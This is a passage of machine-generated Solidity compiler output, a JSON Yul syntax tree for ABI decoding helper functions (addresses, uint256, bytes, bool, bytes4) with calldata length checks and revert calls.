a00a4f17d46d","nodeType":"YulIdentifier","src":"1122:77:15"},"nodeType":"YulFunctionCall","src":"1122:79:15"},"nodeType":"YulExpressionStatement","src":"1122:79:15"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1099:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1107:4:15","type":"","value":"0x1f"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1095:3:15"},"nodeType":"YulFunctionCall","src":"1095:17:15"},{"name":"end","nodeType":"YulIdentifier","src":"1114:3:15"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1091:3:15"},"nodeType":"YulFunctionCall","src":"1091:27:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"1084:6:15"},"nodeType":"YulFunctionCall","src":"1084:35:15"},"nodeType":"YulIf","src":"1081:122:15"},{"nodeType":"YulVariableDeclaration","src":"1212:34:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1239:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1226:12:15"},"nodeType":"YulFunctionCall","src":"1226:20:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"1216:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1255:87:15","value":{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1315:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1323:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1311:3:15"},"nodeType":"YulFunctionCall","src":"1311:17:15"},{"name":"length","nodeType":"YulIdentifier","src":"1330:6:15"},{"name":"end","nodeType":"YulIdentifier","src":"1338:3:15"}],"functionName":{"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"1264:46:15"},"nodeType":"YulFunctionCall","src":"1264:78:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"1255:5:15"}]}]},"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1049:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1057:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"1065:5:15","type":""}],"src":"1010:338:15"},{"body":{"nodeType":"YulBlock","src":"1406:87:15","statements":[{"nodeType":"YulAssignment","src":"1416:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1438:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1425:12:15"},"nodeType":"YulFunctionCall","src":"1425:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"1416:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1481:5:15"}],"functionName":{"name":"validator_revert_t_uint256","nodeType":"YulIdentifier","src":"1454:26:15"},"nodeType":"YulFunctionCall","src":"1454:33:15"},"nodeType":"YulExpressionStatement","src":"1454:33:15"}]},"name":"abi_decode_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1384:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1392:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"1400:5:15","type":""}],"src":"1354:139:15"},{"body":{"nodeType":"YulBlock","src":"1565:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"1611:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1613:77:15"},"nodeType":"YulFunctionCall","src":"1613:79:15"},"nodeType":"YulExpressionStatement","src":"1613:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1586:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1595:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1582:3:15"},"nodeType":"YulFunctionCall","src":"1582:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1607:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1578:3:15"},"nodeType":"YulFunctionCall","src":"1578:32:15"},"nodeType":"YulIf","src":"1575:119:15"},{"nodeType":"YulBlock","src":"1704:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1719:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1733:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1723:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1748:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1783:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1794:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1779:3:15"},"nodeType":"YulFunctionCall","src":"1779:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1803:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"1758:20:15"},"nodeType":"YulFunctionCall","src":"1758:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1748:6:15"}]}]}]},"name":"abi_decode_tuple_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1535:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1546:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1558:6:15","type":""}],"src":"1499:329:15"},{"body":{"nodeType":"YulBlock","src":"1917:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"1963:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1965:77:15"},"nodeType":"YulFunctionCall","src":"1965:79:15"},"nodeType":"YulExpressionStatement","src":"1965:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1938:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1947:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1934:3:15"},"nodeType":"YulFunctionCall","src":"1934:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1959:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1930:3:15"},"nodeType":"YulFunctionCall","src":"1930:32:15"},"nodeType":"YulIf","src":"1927:119:15"},{"nodeType":"YulBlock","src":"2056:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2071:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2085:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2075:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2100:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2135:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2146:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2131:3:15"},"nodeType":"YulFunctionCall","src":"2131:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2155:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2110:20:15"},"nodeType":"YulFunctionCall","src":"2110:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2100:6:15"}]}]},{"nodeType":"YulBlock","src":"2183:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2198:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2212:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2202:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2228:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2263:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2274:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2259:3:15"},"nodeType":"YulFunctionCall","src":"2259:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2283:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2238:20:15"},"nodeType":"YulFunctionCall","src":"2238:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2228:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1879:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1890:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1902:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"1910:6:15","type":""}],"src":"1834:474:15"},{"body":{"nodeType":"YulBlock","src":"2414:519:15","statements":[{"body":{"nodeType":"YulBlock","src":"2460:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"2462:77:15"},"nodeType":"YulFunctionCall","src":"2462:79:15"},"nodeType":"YulExpressionStatement","src":"2462:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"2435:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"2444:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2431:3:15"},"nodeType":"YulFunctionCall","src":"2431:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"2456:2:15","type":"","value":"96"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"2427:3:15"},"nodeType":"YulFunctionCall","src":"2427:32:15"},"nodeType":"YulIf","src":"2424:119:15"},{"nodeType":"YulBlock","src":"2553:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2568:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2582:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2572:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2597:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2632:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2643:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2628:3:15"},"nodeType":"YulFunctionCall","src":"2628:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2652:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2607:20:15"},"nodeType":"YulFunctionCall","src":"2607:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2597:6:15"}]}]},{"nodeType":"YulBlock","src":"2680:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2695:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2709:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2699:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2725:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2760:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2771:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2756:3:15"},"nodeType":"YulFunctionCall","src":"2756:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2780:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2735:20:15"},"nodeType":"YulFunctionCall","src":"2735:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2725:6:15"}]}]},{"nodeType":"YulBlock","src":"2808:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2823:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2837:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2827:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2853:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2888:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2899:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2884:3:15"},"nodeType":"YulFunctionCall","src":"2884:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2908:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"2863:20:15"},"nodeType":"YulFunctionCall","src":"2863:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"2853:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"2368:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"2379:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"2391:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"2399:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"2407:6:15","type":""}],"src":"2314:619:15"},{"body":{"nodeType":"YulBlock","src":"3065:817:15","statements":[{"body":{"nodeType":"YulBlock","src":"3112:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"3114:77:15"},"nodeType":"YulFunctionCall","src":"3114:79:15"},"nodeType":"YulExpressionStatement","src":"3114:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3086:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3095:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3082:3:15"},"nodeType":"YulFunctionCall","src":"3082:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"3107:3:15","type":"","value":"128"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3078:3:15"},"nodeType":"YulFunctionCall","src":"3078:33:15"},"nodeType":"YulIf","src":"3075:120:15"},{"nodeType":"YulBlock","src":"3205:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3220:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3234:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3224:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3249:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3284:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3295:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3280:3:15"},"nodeType":"YulFunctionCall","src":"3280:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3304:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3259:20:15"},"nodeType":"YulFunctionCall","src":"3259:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"3249:6:15"}]}]},{"nodeType":"YulBlock","src":"3332:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3347:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3361:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3351:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3377:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3412:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3423:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3408:3:15"},"nodeType":"YulFunctionCall","src":"3408:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3432:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3387:20:15"},"nodeType":"YulFunctionCall","src":"3387:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"3377:6:15"}]}]},{"nodeType":"YulBlock","src":"3460:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3475:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3489:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3479:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3505:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3540:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3551:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3536:3:15"},"nodeType":"YulFunctionCall","src":"3536:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3560:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"3515:20:15"},"nodeType":"YulFunctionCall","src":"3515:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"3505:6:15"}]}]},{"nodeType":"YulBlock","src":"3588:287:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3603:46:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3634:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"3645:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3630:3:15"},"nodeType":"YulFunctionCall","src":"3630:18:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"3617:12:15"},"nodeType":"YulFunctionCall","src":"3617:32:15"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3607:6:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"3696:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulIdentifier","src":"3698:77:15"},"nodeType":"YulFunctionCall","src":"3698:79:15"},"nodeType":"YulExpressionStatement","src":"3698:79:15"}]},"condition":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"3668:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"3676:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"3665:2:15"},"nodeType":"YulFunctionCall","src":"3665:30:15"},"nodeType":"YulIf","src":"3662:117:15"},{"nodeType":"YulAssignment","src":"3793:72:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3837:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3848:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3833:3:15"},"nodeType":"YulFunctionCall","src":"3833:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3857:7:15"}],"functionName":{"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"3803:29:15"},"nodeType":"YulFunctionCall","src":"3803:62:15"},"variableNames":[{"name":"value3","nodeType":"YulIdentifier","src":"3793:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3011:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3022:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3034:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3042:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"3050:6:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"3058:6:15","type":""}],"src":"2939:943:15"},{"body":{"nodeType":"YulBlock","src":"3968:388:15","statements":[{"body":{"nodeType":"YulBlock","src":"4014:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4016:77:15"},"nodeType":"YulFunctionCall","src":"4016:79:15"},"nodeType":"YulExpressionStatement","src":"4016:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3989:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3998:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3985:3:15"},"nodeType":"YulFunctionCall","src":"3985:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4010:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3981:3:15"},"nodeType":"YulFunctionCall","src":"3981:32:15"},"nodeType":"YulIf","src":"3978:119:15"},{"nodeType":"YulBlock","src":"4107:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4122:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4136:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4126:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4151:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4186:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4197:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4182:3:15"},"nodeType":"YulFunctionCall","src":"4182:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4206:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4161:20:15"},"nodeType":"YulFunctionCall","src":"4161:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4151:6:15"}]}]},{"nodeType":"YulBlock","src":"4234:115:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4249:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4263:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4253:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4279:60:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4311:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4322:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4307:3:15"},"nodeType":"YulFunctionCall","src":"4307:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4331:7:15"}],"functionName":{"name":"abi_decode_t_bool","nodeType":"YulIdentifier","src":"4289:17:15"},"nodeType":"YulFunctionCall","src":"4289:50:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4279:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3930:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3941:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3953:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3961:6:15","type":""}],"src":"3888:468:15"},{"body":{"nodeType":"YulBlock","src":"4445:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"4491:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4493:77:15"},"nodeType":"YulFunctionCall","src":"4493:79:15"},"nodeType":"YulExpressionStatement","src":"4493:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4466:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4475:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4462:3:15"},"nodeType":"YulFunctionCall","src":"4462:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4487:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4458:3:15"},"nodeType":"YulFunctionCall","src":"4458:32:15"},"nodeType":"YulIf","src":"4455:119:15"},{"nodeType":"YulBlock","src":"4584:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4599:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4613:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4603:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4628:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4663:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4674:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4659:3:15"},"nodeType":"YulFunctionCall","src":"4659:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4683:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4638:20:15"},"nodeType":"YulFunctionCall","src":"4638:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4628:6:15"}]}]},{"nodeType":"YulBlock","src":"4711:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4726:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4740:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4730:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4756:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4791:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4802:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4787:3:15"},"nodeType":"YulFunctionCall","src":"4787:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4811:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"4766:20:15"},"nodeType":"YulFunctionCall","src":"4766:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4756:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4407:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4418:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4430:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"4438:6:15","type":""}],"src":"4362:474:15"},{"body":{"nodeType":"YulBlock","src":"4907:262:15","statements":[{"body":{"nodeType":"YulBlock","src":"4953:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4955:77:15"},"nodeType":"YulFunctionCall","src":"4955:79:15"},"nodeType":"YulExpressionStatement","src":"4955:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4928:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4937:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4924:3:15"},"nodeType":"YulFunctionCall","src":"4924:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4949:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4920:3:15"},"nodeType":"YulFunctionCall","src":"4920:32:15"},"nodeType":"YulIf","src":"4917:119:15"},{"nodeType":"YulBlock","src":"5046:116:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5061:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5075:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5065:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5090:62:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5124:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5135:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5120:3:15"},"nodeType":"YulFunctionCall","src":"5120:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5144:7:15"}],"functionName":{"name":"abi_decode_t_bytes4","nodeType":"YulIdentifier","src":"5100:19:15"},"nodeType":"YulFunctionCall","src":"5100:52:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5090:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4877:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4888:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4900:6:15","type":""}],"src":"4842:327:15"},{"body":{"nodeType":"YulBlock","src":"5251:273:15","statements":[{"body":{"nodeType":"YulBlock","src":"5297:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5299:77:15"},"nodeType":"YulFunctionCall","src":"5299:79:15"},"nodeType":"YulExpressionStatement","src":"5299:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5272:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5281:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5268:3:15"},"nodeType":"YulFunctionCall","src":"5268:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5293:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5264:3:15"},"nodeType":"YulFunctionCall","src":"5264:32:15"},"nodeType":"YulIf","src":"5261:119:15"},{"nodeType":"YulBlock","src":"5390:127:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5405:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5419:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5409:6:15","type":""}]},{"nodeType":"YulAssignme